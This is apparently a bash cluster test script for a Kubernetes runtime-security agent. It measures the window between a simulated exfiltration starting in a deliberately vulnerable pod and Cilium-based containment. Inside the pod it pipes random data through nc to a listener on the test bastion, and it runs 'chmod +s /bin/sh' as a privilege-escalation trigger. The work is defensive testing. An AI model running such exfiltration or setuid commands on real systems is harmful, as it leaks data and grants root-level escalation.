#!/bin/bash
# =============================================================================
# ZTRE Cluster Test — Scenario 4: Exfiltration Race Window
# Measures the window between exfiltration start and Cilium wire-cut containment.
#
# References:
#   - doc/ADVANCED_TEST_PLAN.md v1.3.0 (Scenario 4)
#   - PRD NFR-01: Containment latency SLA (< 50ms)
# =============================================================================
set -uo pipefail

# ---- Directory and Environment Setup ----------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." 2>/dev/null && pwd || pwd)"

# Source common test library if present
if [ -f "${SCRIPT_DIR}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  . "${SCRIPT_DIR}/lib/common.sh"
elif [ -f "${REPO_ROOT}/tests/cluster/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  . "${REPO_ROOT}/tests/cluster/lib/common.sh"
elif [ -f "${REPO_ROOT}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  . "${REPO_ROOT}/lib/common.sh"
elif [ -f "lib/common.sh" ]; then
  # shellcheck source=/dev/null
  . "lib/common.sh"
fi

# ---- Default Configuration (ground truth cluster values) ---------------------
NS="${NS:-ztre-test}"
AGENT_NS="${AGENT_NS:-ztre-system}"
AGENT_LABEL="${AGENT_LABEL:-app.kubernetes.io/name=ztre-agent}"
WORKER_IP="${WORKER_IP:-10.91.128.11}"
BASTION_IP="${BASTION_IP:-10.91.128.10}"
EXFIL_PORT="${EXFIL_PORT:-9999}"
EVIDENCE_DIR="${EVIDENCE_DIR:-evidence/advanced}"
TS="${TS:-$(date +%Y%m%d-%H%M%S)}"

# Resolve EVIDENCE_DIR relative to repo root if relative
case "$EVIDENCE_DIR" in
  /*) : ;;
  *) EVIDENCE_DIR="$REPO_ROOT/$EVIDENCE_DIR" ;;
esac
mkdir -p "$EVIDENCE_DIR"
LOG="${LOG:-$EVIDENCE_DIR/run-$TS.log}"

# ---- Helper Fallbacks (if not provided by lib/common.sh) ---------------------
if ! declare -F say >/dev/null 2>&1; then
  say() { echo "$*" | tee -a "$LOG"; }
fi

if ! declare -F hdr >/dev/null 2>&1; then
  hdr() { say ""; say "============================================================"; say "$*"; say "============================================================"; }
fi

if ! declare -F agent_logs >/dev/null 2>&1; then
  agent_logs() { kubectl logs -n "$AGENT_NS" -l "$AGENT_LABEL" --tail=2000 2>/dev/null; }
fi

if ! declare -F get_pod >/dev/null 2>&1; then
  get_pod() { kubectl get pod -n "$NS" -l "app=$1" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null; }
fi

if ! declare -F tcp_catcher >/dev/null 2>&1; then
  tcp_catcher() {
    python3 - "$1" "$2" "$3" <<'PY'
import socket, sys
port, out, secs = int(sys.argv[1]), sys.argv[2], float(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port))
s.listen(5)
s.settimeout(secs)
try:
    conn, _ = s.accept()
    conn.settimeout(secs)
    f = open(out, "wb") if out != "-" else sys.stdout.buffer
    while True:
        try:
            data = conn.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        f.write(data); f.flush()
except socket.timeout:
    pass
finally:
    try: s.close()
    except Exception: pass
PY
  }
fi

if ! declare -F reset_agent_and_wait >/dev/null 2>&1; then
  reset_agent_and_wait() {
    local target="$1"
    say "[reset] clearing quarantine label for: $target"
    kubectl label pod -n "$NS" -l "app=$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || \
    kubectl label pod -n "$NS" "$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || true

    say "[reset] restarting ztre-agent daemonset (clears sync.Map dedup cache)"
    kubectl rollout restart daemonset -n "$AGENT_NS" ztre-agent >/dev/null 2>&1
    kubectl rollout status daemonset -n "$AGENT_NS" ztre-agent --timeout=40s >/dev/null 2>&1 || true

    local timeout=20
    while [ "$timeout" -gt 0 ]; do
      if agent_logs | grep -q "Tetragon gRPC event stream established"; then
        say "[reset] agent gRPC stream confirmed open"
        break
      fi
      sleep 1
      timeout=$((timeout - 1))
    done
    sleep 2
  }
fi

# ---- Scenario 4 Implementation ----------------------------------------------
run_scenario4() {
  local target_input="${1:-${TARGET_POD:-}}"
  local target_pod=""

  hdr "Scenario 4: Exfiltration Race Window"

  # Validate prerequisite CLI tools on bastion
  for tool in python3 jq kubectl date; do
    if ! command -v "$tool" >/dev/null 2>&1; then
      say "[FAIL] [SC4] required tool '$tool' missing on bastion"
      return 1
    fi
  done

  # Resolve target pod: passed pod name, passed app label, or discover vulnerable-app / vulnerable-web
  if [ -n "$target_input" ]; then
    if kubectl get pod -n "$NS" "$target_input" >/dev/null 2>&1; then
      target_pod="$target_input"
    else
      target_pod=$(get_pod "$target_input")
    fi
  fi

  if [ -z "$target_pod" ]; then
    target_pod=$(get_pod vulnerable-app)
  fi
  if [ -z "$target_pod" ]; then
    target_pod=$(get_pod vulnerable-web)
  fi

  if [ -z "$target_pod" ]; then
    say "[FAIL] [SC4] target pod not found in namespace '$NS' (tried vulnerable-app, vulnerable-web)"
    return 1
  fi
  say "[info] [SC4] target pod: $target_pod"

  # Optional reachability check to worker node via ssh batch mode
  if ssh -o BatchMode=yes -o ConnectTimeout=3 "node2@$WORKER_IP" true 2>/dev/null; then
    say "[OK] [SC4] worker node $WORKER_IP reachable (ssh)"
  else
    say "[WARN] [SC4] ssh to worker $WORKER_IP failed; continuing (kubectl path active)"
  fi

  # Reset agent state and clear existing quarantine label
  reset_agent_and_wait "$target_pod"

  local recv_file="$EVIDENCE_DIR/race_exfil-$TS.bin"
  rm -f "$recv_file"
  touch "$recv_file"

  say "[SC4] starting bastion TCP receiver on :$EXFIL_PORT"
  tcp_catcher "$EXFIL_PORT" "$recv_file" 35 &
  local recv_pid=$!

  # Record T0 millisecond epoch right before triggering payload
  local t0
  t0=$(date +%s%3N)
  say "[SC4] T0 (attack start) = $t0"

  # Launch background exfil stream throttled to ~200KB/s and trigger containment via chmod +s
  # BusyBox-safe syntax for alpine / distroless shells
  kubectl exec -n "$NS" "$target_pod" -- sh -c "
    ( while true; do dd if=/dev/urandom bs=1024 count=20 2>/dev/null; sleep 0.1; done ) | nc $BASTION_IP $EXFIL_PORT &
    EXFIL_PID=\$!
    sleep 0.2
    chmod +s /bin/sh
    sleep 25
    kill \$EXFIL_PID 2>/dev/null || true
  " >/dev/null 2>&1 &

  # Watchdog: monitor file size stagnation (wire cut by Cilium network policy)
  # 30-second cap (60 iterations @ 0.5s interval).
  local last_size=0
  local stall_count=0
  local loop_count=0
  local t2=""
  local last_change_time="$t0"

  while kill -0 "$recv_pid" 2>/dev/null; do
    local cur_size
    cur_size=$(wc -c < "$recv_file" 2>/dev/null || echo 0)
    cur_size="${cur_size//[!0-9]/}"
    [ -n "$cur_size" ] || cur_size=0

    if [ "$cur_size" -gt "$last_size" ]; then
      last_size="$cur_size"
      last_change_time=$(date +%s%3N)
      stall_count=0
    elif [ "$cur_size" -gt 0 ] && [ "$cur_size" -eq "$last_size" ]; then
      stall_count=$((stall_count + 1))
      # Stagnation for 4 intervals (2.0s) confirms wire cut
      if [ "$stall_count" -ge 4 ]; then
        t2="$last_change_time"
        kill "$recv_pid" 2>/dev/null || true
        say "[SC4] exfiltration stagnation detected (wire cut)"
        break
      fi
    fi

    loop_count=$((loop_count + 1))
    if [ "$loop_count" -ge 60 ]; then
      t2=$(date +%s%3N)
      kill "$recv_pid" 2>/dev/null || true
      say "[SC4][WARN] watchdog timeout after 30s"
      break
    fi
    sleep 0.5
  done

  # Fallback if t2 was not assigned
  if [ -z "$t2" ]; then
    t2=$(date +%s%3N)
  fi

  # Extract T1 containment event timestamp from ztre-agent logs (scoped to target pod)
  local t1_iso t1_latency t1_epoch=""
  t1_iso=$(agent_logs | jq -rR --arg pod "$target_pod" \
    'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY" and .pod==$pod) | .timestamp' 2>/dev/null | tail -1)
  t1_latency=$(agent_logs | jq -rR --arg pod "$target_pod" \
    'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY" and .pod==$pod) | .latency' 2>/dev/null | tail -1)

  # Fallback if pod name was omitted or unqualified in agent log
  if [ -z "$t1_iso" ] || [ "$t1_iso" = "null" ]; then
    t1_iso=$(agent_logs | jq -rR \
      'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY") | .timestamp' 2>/dev/null | tail -1)
    t1_latency=$(agent_logs | jq -rR \
      'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY") | .latency' 2>/dev/null | tail -1)
  fi
  [ "$t1_iso" != "null" ] || t1_iso=""
  [ "$t1_latency" != "null" ] || t1_latency=""

  # Convert T1 (ISO8601) to epoch milliseconds
  if [ -n "$t1_iso" ]; then
    t1_epoch=$(date -d "$t1_iso" +%s%3N 2>/dev/null || true)
    if [ -z "$t1_epoch" ]; then
      t1_epoch=$(python3 -c '
import sys
from datetime import datetime
ts = sys.argv[1].replace("Z", "+00:00")
print(int(datetime.fromisoformat(ts).timestamp() * 1000))
' "$t1_iso" 2>/dev/null || true)
    fi
  fi

  local bytes_leaked
  bytes_leaked=$(wc -c < "$recv_file" 2>/dev/null || echo 0)
  bytes_leaked="${bytes_leaked//[!0-9]/}"
  [ -n "$bytes_leaked" ] || bytes_leaked=0
  local kb_leaked=$((bytes_leaked / 1024))

  local attack_window_ms=0
  if [ "$bytes_leaked" -gt 0 ]; then
    attack_window_ms=$((t2 - t0))
    [ "$attack_window_ms" -ge 0 ] || attack_window_ms=0
  fi

  local escape_window_ms=""
  if [ -n "$t1_epoch" ] && [ -n "$t2" ]; then
    escape_window_ms=$((t2 - t1_epoch))
  fi

  say "[SC4] T0 attack start      : $t0"
  say "[SC4] T1 ZTRE patch (ISO)  : ${t1_iso:-<none>} (api latency ${t1_latency:-?}s)"
  if [ -n "$t1_epoch" ]; then
    say "[SC4] T1 ZTRE patch (epoch): $t1_epoch ms"
  fi
  say "[SC4] T2 cilium wire cut   : $t2"
  say "[SC4] attack window (T2-T0): ${attack_window_ms} ms"
  if [ -n "$escape_window_ms" ]; then
    say "[SC4] escape window (T2-T1): ${escape_window_ms} ms (clock-skew caveat)"
  else
    say "[SC4] escape window (T2-T1): <none>"
  fi
  say "[SC4] data leaked          : ${kb_leaked} KB (${bytes_leaked} bytes)"

  # Check if pod was actually quarantined
  local quar_label
  quar_label=$(kubectl get pod -n "$NS" "$target_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || echo "")

  local verdict="FAIL"
  if [ "$quar_label" = "true" ] && [ "$bytes_leaked" -gt 0 ] && [ "$attack_window_ms" -gt 0 ]; then
    verdict="PASS"
  elif [ "$quar_label" = "true" ]; then
    verdict="PASS_ZERO_LEAK"
  fi
  say "[SC4] verdict              : $verdict (quarantine_label=${quar_label:-none})"

  # Build JSON result fragment
  local json_fragment="$EVIDENCE_DIR/scenario4_exfil_race-$TS.json"
  local json_canonical="$EVIDENCE_DIR/scenario4_result.json"

  jq -n \
    --arg ts "$TS" \
    --arg target "$target_pod" \
    --arg quar "${quar_label:-false}" \
    --arg t0 "$t0" \
    --arg t1_iso "${t1_iso:-}" \
    --arg t1_epoch "${t1_epoch:-}" \
    --arg t1_lat "${t1_latency:-}" \
    --arg t2 "$t2" \
    --arg bytes "$bytes_leaked" \
    --arg kb "$kb_leaked" \
    --arg attack_window "$attack_window_ms" \
    --arg escape_window "${escape_window_ms:-}" \
    --arg verdict "$verdict" \
    '{
      timestamp: $ts,
      scenario: "scenario4_exfil_race",
      verdict: $verdict,
      target_pod: $target,
      quarantined: ($quar == "true"),
      t0_ms: ($t0 | tonumber? // $t0),
      t1_iso: (if $t1_iso == "" then null else $t1_iso end),
      t1_epoch_ms: (if $t1_epoch == "" then null else ($t1_epoch | tonumber? // null) end),
      t1_latency: (if $t1_lat == "" then null else $t1_lat end),
      t2_ms: ($t2 | tonumber? // $t2),
      attack_window_ms: ($attack_window | tonumber? // $attack_window),
      escape_window_ms: (if $escape_window == "" then null else ($escape_window | tonumber? // null) end),
      bytes_leaked: ($bytes | tonumber? // $bytes),
      kb_leaked: ($kb | tonumber? // $kb),
      scenario4: {
        bytes_leaked: $bytes,
        kb_leaked: $kb,
        attack_window_ms: $attack_window,
        escape_window_ms: $escape_window,
        quarantine_label: $quar
      }
    }' > "$json_fragment"

  cp "$json_fragment" "$json_canonical" 2>/dev/null || true
  say "[SC4] JSON fragment written : $json_fragment"
  say "[SC4] exfil dump written   : $recv_file"

  return 0
}

# If script executed directly rather than sourced, execute run_scenario4
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  run_scenario4 "$@"
fi
